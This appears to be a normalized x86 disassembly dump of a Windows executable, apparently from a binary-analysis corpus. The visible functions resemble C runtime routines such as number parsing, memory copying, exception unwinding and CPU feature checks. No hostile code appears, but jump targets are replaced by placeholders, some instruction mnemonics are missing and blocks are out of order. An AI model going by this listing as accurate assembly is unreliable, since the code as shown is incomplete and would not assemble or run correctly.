movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
push 0x1
push [ eax + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x2
push ecx
push 0x2
lea ecx [ ebx - 0x1 ]
push ecx
push edi
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_418df5
add esp 0x24
cmp eax 0x1
jne r-xdata
xor ecx ecx
jmp r-xdata
call sub_412089
mov [ eax ] 0x16
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx ax [ ebp - 0x4 ]
movzx cx [ ebp - 0x3 ]
shl ax 0x8
add ax cx
inc [ ebp + 0x8 ]
movzx esi ax
mov eax [ ebp - 0x10 ]
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
cmp cx si
jne r-xdata
cmp eax 0x2
jne r-xdata
movzx ax [ ebp - 0x4 ]
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
jmp r-xdata
movzx ax [ ebp - 0x4 ]
movzx cx [ ebp - 0x3 ]
shl ax 0x8
add ax cx
movzx ecx ax
mov eax [ ebp - 0x10 ]
inc ebx
jmp r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
movzx cx [ edx ]
movzx ecx cx
movzx esi cl
inc edx
test [ esi + eax + 0x1d ] 0x4
mov [ ebp + 0x8 ] edx
je r-xdata
sub_41b3c6
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411354
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx cx [ eax ]
dec [ ebp + 0x10 ]
movzx ecx cx
movzx edx cl
inc eax
test [ edx + edi + 0x1d ] 0x4
mov [ ebp + 0x8 ] eax
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
jne r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
xor edx edx
inc [ ebp + 0x8 ]
mov dh cl
mov dl al
movzx ecx dx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
xor ebx ebx
mov bh al
inc esi
mov bl dl
movzx eax bx
xor ebx ebx
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41b548
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b568
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_413965
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_41b5ad
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41b5ad
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_41b568
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41b65d
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41b67c
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41b65d
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41b67f
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_410556
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_412089
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_4195ef
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test cx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_412089
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov al [ ebp + 0x18 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_41b8aa
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_41b67f
add esp 0x14
pop ebp
retn
sub_41b8e0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_41b90d
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_410556
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41ee1b
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41e397
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
sub_41b9b3
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_410556
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41ee1b
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41e8d9
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
sub_41ba60
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41bae8 ]
jmp [ ecx * 4 + jump_table_41bb68 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41bbd4 ]
pop esi
pop edi
pop ebp
jmp sub_41950c
jmp [ ecx * 4 + jump_table_41bd70 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_41bc74 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41bd70 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41bbd4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41bd70 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41bbd4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41bbd4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41bbd4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41bd70 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41bd70 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41bd70 ]
sub_41bdc5
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ecx + 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_412089
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_412089
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_415b90
inc eax
push eax
push edi
push esi
call sub_41ba60
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_41be82
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_41bf3d
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41be82
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_41f4df
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_415600
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_413965
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_411f2e
add esp 0x14
sub_41bfd0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_41c0b0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_41c0cf
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
test ecx 0xfcf0fce0
push esi
je r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
push eax
push [ ebp + 0xc ]
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_41fed5
call sub_41fed5
mov [ esi ] eax
jmp r-xdata
call sub_412089
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_41202a
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_41fed5
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_41c189
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_41c139
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_41c1f6
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4201d8
test al 0x90
pop ecx
pop ecx
jne r-xdata
xor eax eax
leave
retn
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41d906
fcomp [ ebp + 0x8 ]
pop ecx
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
fld [ ebp + 0x8 ]
push ecx
fmul [ r--data ]
push ecx
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
fstp [ esp ]
call sub_41d906
fcomp [ ebp - 0x8 ]
pop ecx
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
xor eax eax
inc eax
leave
retn
push 0x2
pop eax
leave
retn
sub_41c25a
push ebp
mov ebp esp
fldz
push esi
fcom [ ebp + 0x8 ]
xor edx edx
xor esi esi
fnstsw ax
fld [ ebp + 0x8 ]
test ah 0x41
jne r-xdata
mov eax 0x7ff00000
cmp [ ebp + 0x14 ] eax
mov ecx 0xfff00000
jne r-xdata
fchs
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
